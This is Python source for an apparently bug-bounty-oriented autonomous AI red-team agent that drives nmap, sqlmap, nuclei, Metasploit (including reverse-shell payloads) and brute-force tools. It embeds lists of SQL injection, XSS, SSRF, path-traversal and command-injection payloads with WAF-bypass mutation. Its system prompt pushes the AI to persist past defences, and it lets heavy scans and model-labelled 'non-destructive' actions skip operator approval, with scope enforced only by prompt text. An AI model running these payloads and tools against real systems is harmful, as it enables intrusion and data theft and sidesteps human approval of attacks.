"""
BountyOS - Aggressive Agent (Full Power)

Full offensive testing agent powered by Gemini on Vertex AI.
Uses every installed tool at maximum capability:
  - nmap: full NSE scripts, all ports, OS detection
  - sqlmap: level 5 risk 3, all techniques, tamper scripts
  - nuclei: ALL templates, all severities
  - metasploit: AI-selected modules via resource scripts
  - hydra: full brute-force
  - WAF bypass with payload mutation
  - Multi-vector attack chain correlation
"""

import asyncio
import json
import os
import re
import shlex
from typing import Optional, AsyncIterator
from api.ai import get_ai_client

from api.database import session_ctx
from api.models import Approval, ApprovalStatus, Finding, ScanEvent, ScanPhase
from api.tools.discovery import ALL_TOOLS, get_tool
from api.tools.safety import validate_or_raise, validate_command
from api.agents.hacker_mindset import (
    get_hacker_mindset_prompt, infer_technologies_from_events,
    get_technology_playbook, HACKER_QUESTIONS, IMPACT_ESCALATION
)
from api.tools import fullpower

_client = get_ai_client()
MODEL   = os.getenv("BOUNTYOS_AGGRESSIVE_MODEL", os.getenv("BOUNTYOS_MAIN_MODEL", "gemini-2.5-pro"))
MAX_PAYLOAD_VARIANTS = 5

# ─── WAF bypass payloads ──────────────────────────────────────────────────────
WAF_BYPASS_TECHNIQUES = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(5)--",
        "' UNION SELECT NULL,NULL,NULL--", "%27 OR %271%27=%271",
        "' /*!OR*/ '1'='1", "'+OR+1=1--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "admin'--", "' OR 'x'='x", "1; SELECT SLEEP(5)--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>", "<iframe srcdoc='<script>alert(1)</script>'>",
        "<details open ontoggle=alert(1)>", "';alert(1)//",
        "javascript:alert(1)", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    ],
    "ssrf": [
        "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/", "http://100.100.100.200/",
        "dict://127.0.0.1:6379/", "file:///etc/passwd",
        "http://0.0.0.0/", "http://192.168.0.1/",
    ],
    "lfi": [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "rce": [
        "; ls -la", "| id", "`id`", "$(id)",
        "; cat /etc/passwd", "& whoami", "%0Aid", "\nid",
    ],
    "auth_bypass": [
        "admin'--", "admin'/*", "' OR 1=1--", "admin' #",
        "') OR ('1'='1", "admin'||'", "anything' OR 'x'='x",
    ],
}

# ─── AI tool definitions ──────────────────────────────────────────────────────
AGGRESSIVE_AI_TOOLS = [
    {
        "name": "read_all_data",
        "description": "Read all recon findings, events, open ports, technologies discovered. AI uses this to understand the full attack surface before planning.",
        "input_schema": {
            "type": "object",
            "properties": {
                "filter_phase": {"type": "string"},
                "filter_tool": {"type": "string"},
            },
            "required": [],
        },
    },
    {
        "name": "plan_attack_chain",
        "description": "Document the full attack plan before executing. Think step by step about which services to target, which vulnerabilities to check, and in what order.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "chain_steps": {"type": "array", "items": {"type": "string"}},
                "rationale": {"type": "string"},
                "expected_severity": {"type": "string", "enum": ["low","medium","high","critical"]},
            },
            "required": ["target", "chain_steps", "rationale"],
        },
    },
    {
        "name": "run_nmap_full",
        "description": "Run nmap at full power: all ports, full NSE script suite (vuln+exploit+auth+discovery+intrusive), OS detection, version intensity 9. Use this first to map the complete attack surface.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "ports": {"type": "string", "description": "Port range. Use '-' for all ports (slow but thorough) or '1-10000' for top ports"},
                "scripts": {"type": "string", "description": "NSE script categories e.g. 'vuln,exploit,auth,discovery'"},
                "stealth": {"type": "boolean", "description": "SYN scan stealth mode"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "run_sqlmap_full",
        "description": "Run sqlmap at level 5 risk 3 — maximum injection testing. Tests all parameter types, uses tamper scripts for WAF bypass, crawls the target for forms.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "level": {"type": "integer", "description": "1-5, use 5 for maximum"},
                "risk": {"type": "integer", "description": "1-3, use 3 for maximum (includes heavy queries)"},
                "tamper": {"type": "string", "description": "Comma-separated tamper scripts e.g. 'randomcase,space2comment,between'"},
                "technique": {"type": "string", "description": "BEUSTQ = all techniques"},
                "forms": {"type": "boolean"},
                "crawl": {"type": "integer"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "run_nuclei_full",
        "description": "Run nuclei with ALL templates — CVE, exploit, misconfig, exposure, takeover, network, dns, file, headless. Full severity range. This is the most comprehensive automated vuln scan.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "severity": {"type": "string", "description": "Use 'info,low,medium,high,critical' for everything"},
                "tags": {"type": "string", "description": "Filter to specific tags e.g. 'cve,wordpress'. Empty = all templates"},
                "rate_limit": {"type": "integer"},
            },
            "required": ["target"],
        },
    },
    {
        "name": "run_metasploit",
        "description": "Run a Metasploit module. AI selects the exact module based on service fingerprinting. For check_only=true: just verify if vulnerable (no approval needed). For check_only=false: full exploit attempt (REQUIRES approval).",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "module": {"type": "string", "description": "Full module path e.g. 'exploit/multi/http/tomcat_mgr_upload'"},
                "payload": {"type": "string", "description": "Payload path e.g. 'java/meterpreter/reverse_tcp'. Leave empty for auxiliary modules."},
                "options": {"type": "object", "description": "Module options e.g. {RPORT: 8080, USERNAME: admin}"},
                "check_only": {"type": "boolean", "description": "True=check vulnerability only. False=full exploit (requires approval)"},
                "lhost": {"type": "string", "description": "Your IP for reverse shells"},
                "lport": {"type": "integer", "description": "Your port for reverse shells"},
            },
            "required": ["target", "module"],
        },
    },
    {
        "name": "run_tool",
        "description": "Run any other installed tool. Use this for tools not covered by specific actions: ffuf, gobuster, nikto, wpscan, hydra, dalfox, commix, subjack, etc.",
        "input_schema": {
            "type": "object",
            "properties": {
                "tool_name": {"type": "string", "description": "Tool name from installed tools list"},
                "target": {"type": "string"},
                "extra_args": {"type": "string", "description": "Full extra arguments to pass"},
                "destructive": {"type": "boolean", "description": "True if active exploitation or brute-forcing"},
                "reasoning": {"type": "string"},
            },
            "required": ["tool_name", "target", "destructive", "reasoning"],
        },
    },
    {
        "name": "inject_payload",
        "description": "Directly inject a vulnerability payload into a parameter. Always requires approval. Use WAF bypass encoding automatically when needed.",
        "input_schema": {
            "type": "object",
            "properties": {
                "technique": {"type": "string", "enum": list(WAF_BYPASS_TECHNIQUES.keys()) + ["custom"]},
                "target_url": {"type": "string"},
                "parameter": {"type": "string"},
                "payload": {"type": "string"},
                "method": {"type": "string", "enum": ["GET","POST","PUT","PATCH","DELETE"]},
                "waf_bypass": {"type": "boolean"},
                "reasoning": {"type": "string"},
            },
            "required": ["technique", "target_url", "payload", "reasoning"],
        },
    },
    {
        "name": "mutate_payload",
        "description": "When a payload is blocked by a WAF, generate bypass variants automatically. Call this instead of giving up.",
        "input_schema": {
            "type": "object",
            "properties": {
                "technique": {"type": "string"},
                "original_payload": {"type": "string"},
                "block_reason": {"type": "string"},
                "target_technology": {"type": "string"},
            },
            "required": ["technique", "original_payload", "block_reason"],
        },
    },
    {
        "name": "chain_findings",
        "description": "Correlate multiple findings into a higher-severity attack chain. e.g. SSRF + metadata endpoint = credential theft = CRITICAL.",
        "input_schema": {
            "type": "object",
            "properties": {
                "chain_title": {"type": "string"},
                "chain_impact": {"type": "string"},
                "chain_severity": {"type": "string", "enum": ["medium","high","critical"]},
                "chain_steps": {"type": "array", "items": {"type": "string"}},
                "evidence": {"type": "string"},
            },
            "required": ["chain_title", "chain_impact", "chain_severity"],
        },
    },
    {
        "name": "write_finding",
        "description": "Record a confirmed vulnerability finding with full technical details.",
        "input_schema": {
            "type": "object",
            "properties": {
                "title": {"type": "string"},
                "severity": {"type": "string", "enum": ["info","low","medium","high","critical"]},
                "description": {"type": "string"},
                "evidence": {"type": "string"},
                "url": {"type": "string"},
                "cwe_id": {"type": "string"},
                "cvss_score": {"type": "number"},
                "remediation": {"type": "string"},
            },
            "required": ["title", "severity", "description"],
        },
    },
    {
        "name": "finish",
        "description": "Signal that aggressive scan is complete. Provide a comprehensive summary.",
        "input_schema": {
            "type": "object",
            "properties": {
                "summary": {"type": "string"},
                "critical_count": {"type": "integer"},
                "high_count": {"type": "integer"},
                "chains_found": {"type": "integer"},
            },
            "required": ["summary"],
        },
    },
]

# ─── System prompt ────────────────────────────────────────────────────────────
def _system_prompt(target: str, scope: str, oos: str, tool_list: str, tech_hints: list = None) -> str:
    mindset = get_hacker_mindset_prompt(target, scope, "all", tech_hints or [])
    return f"""You are BountyOS Aggressive Agent — an elite autonomous red team operator and expert hacker.

TARGET: {target}
IN-SCOPE: {scope}
OUT-OF-SCOPE: {oos or 'none'}

{mindset}

INSTALLED TOOLS ON THIS SYSTEM ({len(tool_list.splitlines())} tools):
{tool_list}

YOUR AUTONOMOUS ATTACK METHODOLOGY:

PHASE 1 — INTELLIGENCE (always first):
  Call read_all_data to see everything discovered so far.
  Extract: open ports, technologies, subdomains, historical URLs, error messages.
  Identify: tech stack, frameworks, CMS, cloud provider, WAF presence.
  Think: "What is the highest-impact path given what I know?"

PHASE 2 — ATTACK SURFACE MAPPING:
  Call run_nmap_full with full NSE scripts to discover every service.
  Read NSE script output carefully — it reveals CVEs, weak configs, and auth issues.
  For every open port: what service? what version? what known vulnerabilities?

PHASE 3 — TARGETED EXPLOITATION (adapt to what you find):
  WordPress detected  → enumerate users via /wp-json/wp/v2/users, check xmlrpc.php,
                        scan with nuclei wordpress tags, try admin/admin on login
  Tomcat detected     → check /manager/html default creds, check AJP port 8009 (Ghostcat),
                        run metasploit tomcat_mgr_upload if creds found
  Spring Boot detected → check /actuator/env for credentials, /actuator/heapdump for data
  Node.js detected    → test prototype pollution (__proto__[admin]=true), path traversal
  PHP detected        → test LFI with php:// wrappers, type juggling, unserialize
  GraphQL detected    → test introspection, batching attacks, IDOR via node ID
  Login form found    → sqlmap at level 5 risk 3, auth bypass payloads, brute-force
  File upload found   → test double extensions, null bytes, PHP in JPEG, path traversal
  JWT found           → test alg:none, RS256→HS256 confusion, crack weak secret
  S3 bucket found     → check public listing, takeover, versioning

PHASE 4 — BUSINESS LOGIC (the bugs scanners miss):
  Test IDOR: change user IDs in every request — can you access other users' data?
  Test auth flow: can you skip steps? access step 3 without completing step 1-2?
  Test rate limiting: is forgot-password rate limited? SMS OTP? Login attempts?
  Test mass assignment: send extra fields in POST — do they get applied?
  Test price manipulation: negative quantities, direct price field modification?

PHASE 5 — CHAIN AND ESCALATE:
  After each finding, ask: "What does this unlock? What can I reach now?"
  Call chain_findings when 2+ findings combine for higher impact.
  Always think about the business impact, not just the technical finding.

FULL POWER CONFIGS:
  nmap: all ports, full NSE vuln+exploit+auth scripts, OS detection
  sqlmap: level=5 risk=3, BEUSTQ techniques, tamper scripts, forms+crawl
  nuclei: ALL templates, all severities, 150 req/s
  metasploit: AI selects exact module+payload from fingerprint

APPROVAL RULES:
  destructive=false → runs immediately (read-only recon, check-only metasploit)
  destructive=true  → creates approval gate, waits for operator
  WAF blocks payload → call mutate_payload, generate 5 variants, try each
  Never give up after one attempt — expert hackers persist
"""

# ─── Helpers ─────────────────────────────────────────────────────────────────
def _log(scan_id: str, msg: str, level: str = "info"):
    with session_ctx() as s:
        s.add(ScanEvent(
            scan_id=scan_id, phase=ScanPhase.EXPLOIT,
            tool="aggressive-agent", level=level, message=msg,
        ))
        s.commit()


async def _wait_approval(scan_id: str, action: str, context: str, timeout: int = 600) -> bool:
    with session_ctx() as s:
        a = Approval(
            scan_id=scan_id, phase=ScanPhase.EXPLOIT,
            action=action, context=context, status=ApprovalStatus.PENDING,
        )
        s.add(a)
        s.commit()
        s.refresh(a)
        aid = a.id

    _log(scan_id, f"⏳ Awaiting approval: {action}", level="warn")
    deadline = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < deadline:
        await asyncio.sleep(5)
        with session_ctx() as s:
            a = s.get(Approval, aid)
            if a and a.status == ApprovalStatus.APPROVED:
                _log(scan_id, f"✅ Approved: {action}")
                return True
            if a and a.status == ApprovalStatus.REJECTED:
                _log(scan_id, f"❌ Rejected: {action}", level="warn")
                return False
    _log(scan_id, f"⏰ Timed out: {action}", level="warn")
    return False


async def _run_tool_stream(scan_id: str, gen) -> str:
    """Consume an async generator from a tool, persist events, return output summary."""
    output = []
    async for ev in gen:
        with session_ctx() as s:
            s.add(ScanEvent(
                scan_id=scan_id, phase=ScanPhase.EXPLOIT,
                tool=ev.get("tool","?"), level=ev.get("level","info"),
                message=ev["message"], raw=ev.get("raw"),
            ))
            s.commit()
        output.append(ev["message"])
    return "\n".join(output[-80:]) or "No output."


# ─── Tool dispatcher ──────────────────────────────────────────────────────────
async def _dispatch(scan_id: str, tool_name: str, args: dict) -> str:

    # ── read_all_data ─────────────────────────────────────────────────────────
    if tool_name == "read_all_data":
        from sqlmodel import select
        with session_ctx() as s:
            from api.models import ScanEvent as SE, Finding as F
            events   = s.exec(select(SE).where(SE.scan_id == scan_id).order_by(SE.created_at)).all()
            findings = s.exec(select(F).where(F.scan_id == scan_id)).all()
        lines  = [f"[{e.level.upper()}][{e.tool}] {e.message}" for e in events[-150:]]
        flines = [f"  [{f.severity.upper()}] {f.title}" for f in findings]
        return "EVENTS:\n" + "\n".join(lines) + "\n\nFINDINGS SO FAR:\n" + ("\n".join(flines) or "none")

    # ── plan_attack_chain ─────────────────────────────────────────────────────
    elif tool_name == "plan_attack_chain":
        steps = "\n".join(f"  {i+1}. {s}" for i,s in enumerate(args.get("chain_steps",[])))
        _log(scan_id, f"⚔️ ATTACK PLAN for {args.get('target','')}:\n{steps}\n{args.get('rationale','')}")
        return "Plan recorded. Executing..."

    # ── run_nmap_full ─────────────────────────────────────────────────────────
    elif tool_name == "run_nmap_full":
        target  = args.get("target","")
        ports   = args.get("ports", "1-10000")
        scripts = args.get("scripts", "default,safe,vuln,auth,discovery")
        stealth = args.get("stealth", False)
        gen = fullpower.nmap_full(scan_id, target, ports=ports,
                                   scripts=scripts, stealth=stealth)
        return await _run_tool_stream(scan_id, gen)

    # ── run_sqlmap_full ───────────────────────────────────────────────────────
    elif tool_name == "run_sqlmap_full":
        target  = args.get("target","")
        gen = fullpower.sqlmap_full(
            scan_id, target,
            level   = args.get("level", 5),
            risk    = args.get("risk", 3),
            tamper  = args.get("tamper", "randomcase,space2comment,between,charencode"),
            technique = args.get("technique", "BEUSTQ"),
            forms   = args.get("forms", True),
            crawl   = args.get("crawl", 3),
        )
        return await _run_tool_stream(scan_id, gen)

    # ── run_nuclei_full ───────────────────────────────────────────────────────
    elif tool_name == "run_nuclei_full":
        target = args.get("target","")
        gen = fullpower.nuclei_full(
            scan_id, target,
            severity    = args.get("severity", "info,low,medium,high,critical"),
            tags        = args.get("tags", ""),
            rate_limit  = args.get("rate_limit", 150),
        )
        return await _run_tool_stream(scan_id, gen)

    # ── run_metasploit ────────────────────────────────────────────────────────
    elif tool_name == "run_metasploit":
        target     = args.get("target","")
        module     = args.get("module","")
        payload    = args.get("payload")
        options    = args.get("options", {})
        check_only = args.get("check_only", True)
        lhost      = args.get("lhost", "127.0.0.1")
        lport      = args.get("lport", 4444)

        if not check_only:
            approved = await _wait_approval(
                scan_id,
                f"Metasploit EXPLOIT: {module} → {target}",
                f"Module: {module}\nPayload: {payload}\nTarget: {target}\nOptions: {json.dumps(options)}"
            )
            if not approved:
                return f"Metasploit exploit rejected: {module}"

        gen = fullpower.metasploit_run(
            scan_id, target, module, payload, options, check_only, lhost, lport
        )
        return await _run_tool_stream(scan_id, gen)

    # ── run_tool (generic) ───────────────────────────────────────────────────
    elif tool_name == "run_tool":
        tname      = args.get("tool_name","")
        target     = args.get("target","")
        extra      = args.get("extra_args","")
        destructive= args.get("destructive", False)
        reasoning  = args.get("reasoning","")

        # Safety: validate any extra args
        ok, reason = validate_command(f"{tname} {extra}")
        if not ok:
            return f"BLOCKED by safety validator: {reason}"

        if destructive:
            approved = await _wait_approval(
                scan_id,
                f"Run {tname} on {target}",
                f"Tool: {tname}\nTarget: {target}\nArgs: {extra}\nReason: {reasoning}"
            )
            if not approved:
                return f"Rejected: {tname} on {target}"

        tool = get_tool(tname)
        if not tool:
            avail = list(ALL_TOOLS.keys())[:15]
            return f"Tool '{tname}' not installed. Available: {avail}"

        output = []
        async for ev in tool.run(scan_id, target, extra_args=extra):
            with session_ctx() as s:
                s.add(ScanEvent(
                    scan_id=scan_id, phase=ScanPhase.EXPLOIT,
                    tool=tname, level=ev.get("level","info"),
                    message=ev["message"], raw=ev.get("raw"),
                ))
                s.commit()
            output.append(ev["message"])
        return "\n".join(output[-80:]) or "No output."

    # ── inject_payload ────────────────────────────────────────────────────────
    elif tool_name == "inject_payload":
        approved = await _wait_approval(
            scan_id,
            f"Inject [{args.get('technique')}] into {args.get('target_url','')}",
            f"Technique: {args.get('technique')}\nTarget: {args.get('target_url')}\n"
            f"Param: {args.get('parameter','')}\nPayload: {args.get('payload','')}\n"
            f"Reasoning: {args.get('reasoning','')}"
        )
        if not approved:
            return "Payload injection rejected."

        technique  = args.get("technique","")
        target_url = args.get("target_url","")
        parameter  = args.get("parameter","")
        payload    = args.get("payload","")
        method     = args.get("method","GET").upper()
        waf_bypass = args.get("waf_bypass", False)

        from urllib.parse import quote
        p_enc = quote(payload) if waf_bypass else payload
        sep   = "&" if "?" in target_url else "?"
        url   = f"{target_url}{sep}{parameter}={p_enc}" if parameter else target_url

        cmd = f"curl -sk --max-time 15 -X {method} {shlex.quote(url)}"
        ok, reason = validate_command(cmd)
        if not ok:
            return f"BLOCKED: {reason}"

        _log(scan_id, f"💉 [{technique}] → {url[:100]}", level="warn")
        output = []
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
            )
            async for line in proc.stdout:
                d = line.decode(errors="replace").rstrip()
                if d: output.append(d)
            await asyncio.wait_for(proc.wait(), timeout=30)
        except Exception as e:
            return f"Injection error: {e}"

        body = "\n".join(output)
        indicators = {
            "sqli": ["sql syntax","mysql","ora-","warning: mysql","sleep(","error in your sql"],
            "xss": ["<script>alert","onerror=alert","onload=alert", payload.lower()[:15]],
            "ssrf": ["169.254.169.254","metadata","ami-id","root:x:0:0"],
            "lfi": ["root:x:0:0","bin:x:1:1","daemon:x:","/bin/bash"],
            "rce": ["uid=","gid=","root","www-data"],
            "auth_bypass": ["welcome","dashboard","logout","admin panel"],
        }
        hit = any(ind in body.lower() for ind in indicators.get(technique, []))
        if hit:
            _log(scan_id, f"🚨 POTENTIAL {technique.upper()} HIT on {url[:80]}", level="finding")
        return f"Status: {'POTENTIAL_HIT' if hit else 'no_match'}\nResponse ({len(body)} bytes):\n{body[:600]}"

    # ── mutate_payload ────────────────────────────────────────────────────────
    elif tool_name == "mutate_payload":
        technique = args.get("technique","")
        original  = args.get("original_payload","")
        reason    = args.get("block_reason","")
        variants  = [v for v in WAF_BYPASS_TECHNIQUES.get(technique, []) if v != original][:MAX_PAYLOAD_VARIANTS]
        if not variants:
            variants = [
                original.replace("'", "%27"),
                original.replace(" ","/**/"),
                original.upper(),
                original.replace("<","\\u003c").replace(">","\\u003e"),
                original.replace("=","%3D"),
            ]
        _log(scan_id, f"🔄 WAF bypass mutations for {technique}: {len(variants)} variants")
        return "Payload variants:\n" + "\n".join(f"  {i+1}. {v}" for i,v in enumerate(variants))

    # ── chain_findings ────────────────────────────────────────────────────────
    elif tool_name == "chain_findings":
        steps = "\n".join(args.get("chain_steps",[]))
        with session_ctx() as s:
            s.add(Finding(
                scan_id=scan_id,
                title=f"[CHAIN] {args['chain_title']}",
                severity=args["chain_severity"],
                description=f"Attack chain: {args['chain_impact']}\n\nSteps:\n{steps}",
                evidence=args.get("evidence",""),
                tool="aggressive-agent",
            ))
            s.commit()
        _log(scan_id, f"⛓️ [{args['chain_severity'].upper()}] Chain: {args['chain_title']}", level="finding")
        return "Chain finding recorded."

    # ── write_finding ─────────────────────────────────────────────────────────
    elif tool_name == "write_finding":
        with session_ctx() as s:
            f = Finding(
                scan_id=scan_id,
                title=args["title"],
                severity=args["severity"],
                description=args.get("description"),
                evidence=args.get("evidence"),
                url=args.get("url"),
                cwe_id=args.get("cwe_id"),
                cvss_score=args.get("cvss_score"),
                remediation=args.get("remediation"),
                tool="aggressive-agent",
            )
            s.add(f)
            s.commit()
            s.refresh(f)
        _log(scan_id, f"🚨 [{args['severity'].upper()}] {args['title']}", level="finding")
        return f"Finding recorded: {f.id}"

    # ── finish ────────────────────────────────────────────────────────────────
    elif tool_name == "finish":
        _log(scan_id, f"🏁 Aggressive scan complete.\n{args.get('summary','')}")
        return "done"

    return f"Unknown tool: {tool_name}"


# ─── Main entry point ─────────────────────────────────────────────────────────
async def run_aggressive_agent(
    scan_id: str,
    target_domain: str,
    scope: str,
    out_of_scope: Optional[str] = None,
    max_iterations: int = 40,
) -> None:
    tool_list = "\n".join(
        f"  - {name}: {tool.description} [phase={tool.phase}]"
        for name, tool in ALL_TOOLS.items()
    )
    _log(scan_id, f"⚔️ Aggressive Agent — {len(ALL_TOOLS)} tools available")
    _log(scan_id, f"Tools: {', '.join(ALL_TOOLS.keys())}")

    # Infer technologies from any existing events for playbook injection
    with session_ctx() as s:
        from sqlmodel import select as sel
        existing_events = s.exec(sel(ScanEvent).where(ScanEvent.scan_id == scan_id)).all()
        ev_dicts = [{"message": e.message, "raw": e.raw or ""} for e in existing_events]
    tech_hints = infer_technologies_from_events(ev_dicts)
    if tech_hints:
        _log(scan_id, f"🎯 Technology hints detected: {tech_hints} — injecting playbooks")

    system   = _system_prompt(target_domain, scope, out_of_scope or "", tool_list, tech_hints)
    messages = [{
        "role": "user",
        "content": (
            f"Begin full aggressive penetration test of {target_domain}.\n"
            f"You are an expert hacker. Think deeply before every action.\n"
            f"Start with read_all_data to see existing recon, then map attack surface with nmap_full.\n"
            f"Identify the technology stack and adapt your entire strategy to it.\n"
            f"Think about business logic flaws, trust relationships, and impact chains.\n"
            f"A WAF block is not failure — use mutate_payload and try variants.\n"
            f"Chain findings for maximum impact. Always think: what does this unlock?"
        ),
    }]

    finished = False
    for iteration in range(max_iterations):
        if finished: break
        _log(scan_id, f"🔄 Aggressive Agent iteration {iteration+1}/{max_iterations}")

        try:
            response = _client.messages.create(
                model=MODEL, max_tokens=4096, system=system,
                tools=AGGRESSIVE_AI_TOOLS, messages=messages,
            )
        except Exception as e:
            _log(scan_id, f"API error: {e}", level="error")
            break

        messages.append({"role": "assistant", "content": response.content})
        tool_results = []
        has_tools    = False

        for block in response.content:
            if block.type == "text" and block.text.strip():
                _log(scan_id, f"🧠 {block.text.strip()[:400]}")
            elif block.type == "tool_use":
                has_tools = True
                _log(scan_id, f"🔧 {block.name}({json.dumps(block.input or {})[:120]})")
                result = await _dispatch(scan_id, block.name, block.input or {})
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": block.id,
                    "content": result,
                })
                if block.name == "finish":
                    finished = True

        if has_tools:
            messages.append({"role": "user", "content": tool_results})

        if response.stop_reason == "end_turn" and not has_tools and not finished:
            messages.append({
                "role": "user",
                "content": "Continue. What else can you exploit? If done, call finish."
            })

    _log(scan_id, "✅ Aggressive Agent complete")
